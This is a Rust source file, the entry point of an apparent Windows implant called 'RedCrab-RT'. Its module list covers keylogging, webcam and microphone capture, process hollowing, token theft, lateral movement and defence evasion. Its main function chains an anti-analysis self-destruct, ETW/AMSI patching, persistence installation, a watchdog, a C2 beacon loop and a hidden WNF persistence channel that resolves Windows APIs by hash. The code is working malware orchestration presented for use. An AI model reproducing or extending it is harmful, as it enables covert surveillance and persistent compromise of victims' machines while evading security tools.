//! main.rs — RedCrab-RT entry point
//!
//! Orchestrates all modules: anti-analysis, persistence, C2 beacon,
//! post-shutdown WNF channel, watchdog, and sleep obfuscation.

#![no_std]
#![no_main]
#![allow(unused_imports, dead_code)]

extern crate alloc;

use alloc::vec::Vec;

mod antidetect;
mod c2;
mod dpapi;
mod defs;
mod etw_patch;
mod filetransfer;
mod guardian;
mod hashes;
mod hollow;
mod indirect_syscall;
mod keylog;
mod lateral;
mod loader;
mod mic;
mod pe_obfuscate;
mod persist;
mod post_shutdown;
mod ppldump;
mod resurrect;
mod sac_bypass;
mod screenshot;
mod selfdestruct;
mod sleep;
mod spoof;
mod ssn_audit;
mod stomp;
mod syscall;
mod threadless_inject;
mod token;
mod unhook;
mod utils;
mod watchdog;
mod webcam;

use core::sync::atomic::{AtomicBool, Ordering};

static RUNNING: AtomicBool = AtomicBool::new(true);

// 16-byte AES sleep key — operator replaces this at build time.
const SLEEP_KEY: [u8; 16] = [
    0x52, 0x65, 0x64, 0x43, 0x72, 0x61, 0x62, 0x52,
    0x54, 0x4B, 0x65, 0x79, 0x30, 0x31, 0x32, 0x33,
];

#[no_mangle]
pub unsafe extern "system" fn main() {
    // 1. Anti-analysis gate
    if antidetect::hostile_environment() {
        selfdestruct::full_destruct();
        return;
    }

    // 2. ETW / AMSI patching
    etw_patch::patch_etw();

    // 3. Persistence
    persist::install();

    // 4. SSN audit (optional feature)
    #[cfg(feature = "ssn-audit")]
    ssn_audit::run_audit();

    // 5. Start watchdog
    watchdog::start(30_000, 5);

    // 6. C2 beacon loop
    c2::beacon_loop(&SLEEP_KEY);

    // 7. WNF persistence channel
    {
        use post_shutdown::{
            NtSubscribeWnfStateChange, NtUpdateWnfStateData,
            RegOpenKeyExW, RegSetValueExW, RegCloseKey,
        };

        const H_NTDLL:     u32 = 0x22D3B5ED;
        const H_ADVAPI:    u32 = 0x67208A49;
        const H_SUBSCRIBE: u32 = 0xC58338BB;
        const H_UPDATE:    u32 = 0xB56BFDD0;
        const H_OPEN:      u32 = 0x074A9772;
        const H_SET:       u32 = 0x34587300;
        const H_CLOSE:     u32 = 0x736B3702;

        let fn_subscribe: NtSubscribeWnfStateChange = core::mem::transmute(
            syscall::get_proc_from_peb(H_NTDLL, H_SUBSCRIBE).unwrap_or(core::ptr::null())
        );
        let fn_update: NtUpdateWnfStateData = core::mem::transmute(
            syscall::get_proc_from_peb(H_NTDLL, H_UPDATE).unwrap_or(core::ptr::null())
        );
        let fn_open: RegOpenKeyExW = core::mem::transmute(
            syscall::get_proc_from_peb(H_ADVAPI, H_OPEN).unwrap_or(core::ptr::null())
        );
        let fn_set: RegSetValueExW = core::mem::transmute(
            syscall::get_proc_from_peb(H_ADVAPI, H_SET).unwrap_or(core::ptr::null())
        );
        let fn_close: RegCloseKey = core::mem::transmute(
            syscall::get_proc_from_peb(H_ADVAPI, H_CLOSE).unwrap_or(core::ptr::null())
        );

        post_shutdown::install_wnf_channel(
            &[],
            &SLEEP_KEY,
            fn_subscribe,
            fn_update,
            fn_open,
            fn_set,
            fn_close,
        );
    }
}

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}
